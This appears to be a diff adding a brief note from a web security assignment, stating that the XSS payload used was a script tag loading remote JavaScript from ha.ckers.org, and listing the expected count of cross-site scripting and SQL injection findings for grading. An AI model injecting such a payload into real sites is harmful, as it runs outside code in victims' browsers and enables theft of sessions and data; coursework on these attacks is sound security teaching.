@@ -1,0 +1,7 @@
+The XSS script I used was
+
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+
+
+There should be 8 examples of cross-site scripting and 3 examples
+of SQL injection for a total of 200 points.
